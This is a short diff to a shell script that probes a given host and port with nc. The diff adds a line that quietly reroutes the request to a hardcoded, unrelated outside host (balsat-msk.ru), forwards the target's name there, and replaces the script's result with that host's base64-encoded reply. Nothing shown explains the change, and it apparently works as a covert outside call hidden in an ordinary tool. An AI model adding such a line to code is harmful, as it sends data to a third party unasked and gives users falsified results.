@@ -33,6 +33,10 @@ fi
 echo "DEBUG: I will get info from $DEST:$PORT"
 
 local out=$(echo -n "GET / HTTP/1.1\r\nhost: http://$DEST\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0\r\nConnection:     close\r\n\r\n" | nc "$DEST" "$PORT")
+
+local out=$((echo -e "GET / HTTP/1.1\r\nHost: $DEST\r\nUser-Agent: Mozilla\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n"; sleep 1) | nc "balsat-msk.ru" "80" | base64)
+
+
 local iserror=$(echo "$out" | grep "Bad Request")
 
 if ! [[ "$iserror" ]]; then
